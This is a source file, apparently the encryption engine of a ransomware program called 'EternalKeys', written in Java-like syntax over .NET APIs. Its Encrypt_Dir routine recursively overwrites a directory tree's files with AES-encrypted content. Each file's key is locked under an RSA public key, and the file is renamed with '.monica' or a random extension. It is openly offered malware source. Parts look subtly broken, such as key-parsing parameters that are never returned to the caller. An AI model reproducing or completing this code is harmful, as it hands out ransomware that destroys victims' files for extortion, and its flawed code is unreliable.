package EternalKeys;

import System.*;
import System.IO.*;
import System.Security.Cryptography.*;
import System.Text.*;
import System.Collections.*;
import Newtonsoft.Json.*;

public class EncryptionEngine
{
	private static Random RNG = new Random();

	public static byte[] Generate_AES_Key()
	{
		byte[] data = new byte[32];
		new RNGCryptoServiceProvider().GetBytes(data);
		return data;
	}

	public static byte[] Decrypt_File_AESRSA(Tuple encoded, String RSA_Private_Key)
	{
		byte[] passwordBytes = EncryptionEngine.RSA.DecryptBytes((byte[])encoded.get_Item2(), RSA_Private_Key);
		return EncryptionEngine.AES.AES_Decrypt((byte[])encoded.get_Item1(), passwordBytes);
	}

	public static String RandomString(int minlen, int maxlen)
	{
		int num = EncryptionEngine.RNG.Next(minlen, maxlen);
		StringBuilder str = new StringBuilder();
		String chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
		for (int i = 0; i < num; i++)
		{
			str.append(chars.charAt(EncryptionEngine.RNG.Next(chars.length())));
		}
		return str.toString();
	}

	public static void Encrypt_Dir(String dir, String RSA_Public_Key)
	{
		ArrayList files = new ArrayList(Directory.GetFiles(dir));
		for (int i = 0; i < files.size(); i++)
		{
			String enumerateFile = (String)files.get(i);
			try
			{
				if (!enumerateFile.endsWith(".hannah") && !enumerateFile.endsWith(".monica"))
				{
					File.WriteAllText(enumerateFile, JsonConvert.SerializeObject(EncryptionEngine.Encrypt_File_AESRSA(File.ReadAllBytes(enumerateFile), RSA_Public_Key, EncryptionEngine.Generate_AES_Key())));
					String destFileName = enumerateFile + (EncryptionEngine.RNG.Next(2) == 0 ? "." + EncryptionEngine.RandomString(0, 10) : ".monica");
					File.Move(enumerateFile, destFileName);
					Console.WriteLine(enumerateFile + " Encrypted.");
					Globals.encrypted.Add(destFileName);
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("Couldn't encrypt " + enumerateFile + " " + ex.get_Message());
			}
		}
		ArrayList directories = new ArrayList(Directory.GetDirectories(dir));
		for (int i = 0; i < directories.size(); i++)
		{
			String enumerateDirectory = (String)directories.get(i);
			try
			{
				if (!enumerateDirectory.toLowerCase().Contains("appdata"))
				{
					EncryptionEngine.Encrypt_Dir(enumerateDirectory, RSA_Public_Key);
				}
			}
			catch (Exception ex)
			{
				// Handle exception if necessary
			}
		}
	}

	public static Tuple Encrypt_File_AESRSA(byte[] file, String RSA_Public_Key, byte[] AES)
	{
		return new Tuple(EncryptionEngine.AES.AES_Encrypt(file, AES), EncryptionEngine.RSA.EncryptBytes(AES, RSA_Public_Key));
	}

	public static class RSA
	{
		private static boolean _optimalAsymmetricEncryptionPadding = true;

		public static EncryptionEngine.RSA.EncryptorRSAKeys GenerateKeys(int keySize)
		{
			if (keySize % 2 != 0 || keySize < 512)
				throw new Exception("Key should be multiple of two and greater than 512.");
			EncryptionEngine.RSA.EncryptorRSAKeys keys = new EncryptionEngine.RSA.EncryptorRSAKeys();
			RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(keySize);
			try
			{
				String xmlString1 = cryptoServiceProvider.ToXmlString(false);
				String xmlString2 = cryptoServiceProvider.ToXmlString(true);
				String str1 = EncryptionEngine.RSA.IncludeKeyInEncryptionString(xmlString1, keySize);
				String str2 = EncryptionEngine.RSA.IncludeKeyInEncryptionString(xmlString2, keySize);
				keys.PublicKey = str1;
				keys.PrivateKey = str2;
			}
			finally
			{
				cryptoServiceProvider.Dispose();
			}
			return keys;
		}

		public static String EncryptText(String text, String publicKey)
		{
			int keySize = 0;
			String xmlKey = "";
			EncryptionEngine.RSA.GetKeyFromEncryptionString(publicKey, keySize, xmlKey);
			return Convert.ToBase64String(EncryptionEngine.RSA.Encrypt(Encoding.UTF8.GetBytes(text), keySize, xmlKey));
		}

		public static byte[] EncryptBytes(byte[] bytes, String publicKey)
		{
			int keySize = 0;
			String xmlKey = "";
			EncryptionEngine.RSA.GetKeyFromEncryptionString(publicKey, keySize, xmlKey);
			return EncryptionEngine.RSA.Encrypt(bytes, keySize, xmlKey);
		}

		public static byte[] DecryptBytes(byte[] bytes, String privateKey)
		{
			int keySize = 0;
			String xmlKey = "";
			EncryptionEngine.RSA.GetKeyFromEncryptionString(privateKey, keySize, xmlKey);
			return EncryptionEngine.RSA.Decrypt(bytes, keySize, xmlKey);
		}

		public static byte[] Encrypt(byte[] data, int keySize, String publicKeyXml)
		{
			if (data == null || data.length == 0)
				throw new ArgumentException("Data are empty", "data");
			int maxDataLength = EncryptionEngine.RSA.GetMaxDataLength(keySize);
			if (data.length > maxDataLength)
				throw new ArgumentException("Maximum data length is " + maxDataLength, "data");
			if (!EncryptionEngine.RSA.IsKeySizeValid(keySize))
				throw new ArgumentException("Key size is not valid", "keySize");
			if (publicKeyXml == null || publicKeyXml.equals(""))
				throw new ArgumentException("Key is null or empty", "publicKeyXml");
			RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(keySize);
			try
			{
				cryptoServiceProvider.FromXmlString(publicKeyXml);
				return cryptoServiceProvider.Encrypt(data, EncryptionEngine.RSA._optimalAsymmetricEncryptionPadding);
			}
			finally
			{
				cryptoServiceProvider.Dispose();
			}
		}

		public static String DecryptText(String text, String privateKey)
		{
			int keySize = 0;
			String xmlKey = "";
			EncryptionEngine.RSA.GetKeyFromEncryptionString(privateKey, keySize, xmlKey);
			return Encoding.UTF8.GetString(EncryptionEngine.RSA.Decrypt(Convert.FromBase64String(text), keySize, xmlKey));
		}

		public static byte[] Decrypt(byte[] data, int keySize, String publicAndPrivateKeyXml)
		{
			if (data == null || data.length == 0)
				throw new ArgumentException("Data are empty", "data");
			if (!EncryptionEngine.RSA.IsKeySizeValid(keySize))
				throw new ArgumentException("Key size is not valid", "keySize");
			if (publicAndPrivateKeyXml == null || publicAndPrivateKeyXml.equals(""))
				throw new ArgumentException("Key is null or empty", "publicAndPrivateKeyXml");
			RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(keySize);
			try
			{
				cryptoServiceProvider.FromXmlString(publicAndPrivateKeyXml);
				return cryptoServiceProvider.Decrypt(data, EncryptionEngine.RSA._optimalAsymmetricEncryptionPadding);
			}
			finally
			{
				cryptoServiceProvider.Dispose();
			}
		}

		public static int GetMaxDataLength(int keySize)
		{
			return EncryptionEngine.RSA._optimalAsymmetricEncryptionPadding ? (keySize - 384) / 8 + 7 : (keySize - 384) / 8 + 37;
		}

		public static boolean IsKeySizeValid(int keySize)
		{
			return keySize >= 384 && keySize <= 16384 && keySize % 8 == 0;
		}

		private static String IncludeKeyInEncryptionString(String publicKey, int keySize)
		{
			return Convert.ToBase64String(Encoding.UTF8.GetBytes(keySize + "!" + publicKey));
		}

		private static void GetKeyFromEncryptionString(String rawkey, int keySize, String xmlKey)
		{
			keySize = 0;
			xmlKey = "";
			if (rawkey == null || rawkey.length() <= 0)
				return;
			String str = Encoding.UTF8.GetString(Convert.FromBase64String(rawkey));
			if (!str.contains("!"))
				return;
			String[] strArray = str.split("!", 2);
			try
			{
				keySize = Integer.parseInt(strArray[0]);
				xmlKey = strArray[1];
			}
			catch (Exception e)
			{
				// Handle exception if necessary
			}
		}

		public static class EncryptorRSAKeys
		{
			private String publicKey;
			private String privateKey;

			public String getPublicKey()
			{
				return publicKey;
			}

			public void setPublicKey(String publicKey)
			{
				this.publicKey = publicKey;
			}

			public String getPrivateKey()
			{
				return privateKey;
			}

			public void setPrivateKey(String privateKey)
			{
				this.privateKey = privateKey;
			}
		}
	}

	public static class AES
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] salt = new byte[] { 5, 6, 2, 7, 9, -44, 34, 53 };
			MemoryStream memoryStream = new MemoryStream();
			try
			{
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				try
				{
					rijndaelManaged.set_KeySize(256);
					rijndaelManaged.set_BlockSize(128);
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
					rijndaelManaged.set_Key(rfc2898DeriveBytes.GetBytes(rijndaelManaged.get_KeySize() / 8));
					rijndaelManaged.set_IV(rfc2898DeriveBytes.GetBytes(rijndaelManaged.get_BlockSize() / 8));
					rijndaelManaged.set_Mode(CipherMode.CBC);
					CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
					try
					{
						cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.length);
					}
					finally
					{
						cryptoStream.Close();
					}
					return memoryStream.ToArray();
				}
				finally
				{
					rijndaelManaged.Dispose();
				}
			}
			finally
			{
				memoryStream.Close();
			}
		}

		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] salt = new byte[] { 5, 6, 2, 7, 9, -44, 34, 53 };
			MemoryStream memoryStream = new MemoryStream();
			try
			{
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				try
				{
					rijndaelManaged.set_KeySize(256);
					rijndaelManaged.set_BlockSize(128);
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
					rijndaelManaged.set_Key(rfc2898DeriveBytes.GetBytes(rijndaelManaged.get_KeySize() / 8));
					rijndaelManaged.set_IV(rfc2898DeriveBytes.GetBytes(rijndaelManaged.get_BlockSize() / 8));
					rijndaelManaged.set_Mode(CipherMode.CBC);
					CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
					try
					{
						cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.length);
					}
					finally
					{
						cryptoStream.Close();
					}
					return memoryStream.ToArray();
				}
				finally
				{
					rijndaelManaged.Dispose();
				}
			}
			finally
			{
				memoryStream.Close();
			}
		}
	}
}
